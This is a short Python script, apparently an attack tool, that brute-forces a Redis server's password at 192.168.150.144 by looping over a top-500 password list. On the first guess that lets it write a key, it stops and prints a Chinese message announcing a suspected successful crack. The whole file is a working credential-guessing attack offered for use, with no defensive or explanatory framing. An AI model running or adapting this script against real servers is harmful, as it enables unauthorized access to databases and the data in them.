import redis


def blast():
    with open('../dict/u&p/password_top500.txt') as p:
        pswd_list = p.readlines()
    for password in pswd_list:
        try:
            red = redis.Redis(host='192.168.150.144', port=6379, password=f"{password.split()[0]}", db=0)
            red.set('addr', 'chengdu')
            print(f"疑似爆破成功\n密码：{password.split()[0]}")
            return
        except:
            pass


if __name__ == '__main__':
    blast()
